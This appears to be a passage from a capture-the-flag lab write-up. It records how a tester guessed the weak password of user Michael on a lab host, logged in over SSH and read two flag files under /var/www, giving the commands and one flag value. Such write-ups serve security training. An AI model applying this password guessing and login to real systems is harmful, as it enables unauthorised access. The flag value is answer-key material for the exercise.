- Targeting user Michael
    - Small manual Brute Force attack to guess/finds Michaelâ€™s password
    - User password was weak and obvious
    - Password: michael
- Capturing Flag 1: SSH in as Michael traversing through directories and files.
    - Flag 1 found in var/www/html folder at root in service.html in a HTML comment below the footer.
    - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd ../`
        - `cd var/www/html`
        - `ls -l`
        - `nano service.html`

  - **Flag2: fc3fd58dcdad9ab23faca6e9a3e581c**
- Exploit Used:
    - Same exploit used to gain Flag 1.
    - Capturing Flag 2: While SSH in as user Michael Flag 2 was also found.
        - Once again traversing through directories and files as before Flag 2 was found in /var/www next to the html folder that held Flag 1.
        - Commands:
            - `ssh michael@192.168.1.110` 
            - `pw: michael`
            - `cd ../` 
            - `cd ../`
            - `cd var/www`
            - `ls -l`
            - `cat flag2.txt`
